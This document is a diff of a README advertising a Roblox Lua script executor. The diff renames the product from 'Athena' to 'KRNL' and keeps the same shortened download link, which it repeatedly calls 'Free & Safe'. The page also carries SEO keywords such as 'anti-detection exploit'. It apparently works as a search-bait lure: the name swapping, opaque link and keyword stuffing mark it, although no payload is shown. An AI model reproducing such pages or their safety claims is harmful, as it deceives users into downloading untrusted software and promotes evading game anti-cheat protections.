@@ -1,19 +1,19 @@
-# 🚀 Athena Executor — AI-Enhanced Roblox Lua Executor (2025 Release)
+# 🚀 KRNL Executor — AI-Enhanced Roblox Lua Executor (2025 Release)
 
-**Athena Executor** combines AI-powered optimization and safe script execution to help you play smart.
+**KRNL Executor** combines AI-powered optimization and safe script execution to help you play smart.
 
 ---
 
-🔥 [📥 Download Athena Executor (Free & Safe)](https://shorturl.at/xXnQC)  
+🔥 [📥 Download KRNL Executor (Free & Safe)](https://shorturl.at/xXnQC)  
 💻 Compatible with Windows 7–11 (64-bit) | 🛡️ Protection Enabled | 🔄 Auto-Updates
 
 ---
 
-## 🎯 What is Athena Executor?
+## 🎯 What is KRNL Executor?
 
-**Athena Executor** combines AI-powered optimization and safe script execution to help you play smart.
+**KRNL Executor** combines AI-powered optimization and safe script execution to help you play smart.
 
-> 💬 *"Athena is intelligent, fast, and unbeatable."*
+> 💬 *"KRNL is intelligent, fast, and unbeatable."*
 
 ---
 
@@ -50,7 +50,7 @@
 
 ---
 
-## 🥇 Why Choose Athena Executor?
+## 🥇 Why Choose KRNL Executor?
 
 - 🧠 AI script analysis
 - 📈 Smart optimization
@@ -58,16 +58,16 @@
 - 🎯 Targeted script execution
 - 🆙 Always up to date
 
-📦 [👉 Download Athena Executor Now](https://shorturl.at/xXnQC)
+📦 [👉 Download KRNL Executor Now](https://shorturl.at/xXnQC)
 
 ---
 
 ## 🔎 SEO Keywords
 
-- Athena Roblox executor AI
+- KRNL Roblox executor AI
 - Smart Roblox Lua injector
-- Download Athena Executor 2025
-- Athena anti-detection exploit
+- Download KRNL Executor 2025
+- KRNL anti-detection exploit
 - Free safe Roblox executor
 
 ---
